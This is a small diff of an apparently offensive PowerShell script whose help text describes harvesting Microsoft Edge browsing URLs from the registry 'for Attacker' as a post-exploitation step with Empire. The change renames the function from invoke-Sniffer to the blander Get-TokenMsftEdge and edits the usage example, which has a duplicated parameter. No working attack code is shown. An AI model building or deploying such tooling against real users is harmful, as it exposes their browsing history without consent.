@@ -8,7 +8,7 @@
  Sniffer Every URLS the Users Browser Microsoft Edge From location Storage in Registry drag URLS For Attacker
  Note: This Operation Valid For Post Exploitation Empire =!-! 
  .Example
-   PS:> invoke-Snffier -CommandEx NULL
+   PS:> Get-TokenMsftEdge -CommandEx NULL -CommandEx NULL
  .Result
   url1         :any login
   url2         : any login
@@ -38,7 +38,7 @@
  end Everything
 #> 
 
-function invoke-Sniffer {
+function Get-TokenMsftEdge {
 
     [CmdletBinding(SupportsPaging = $true)]    
     param( 
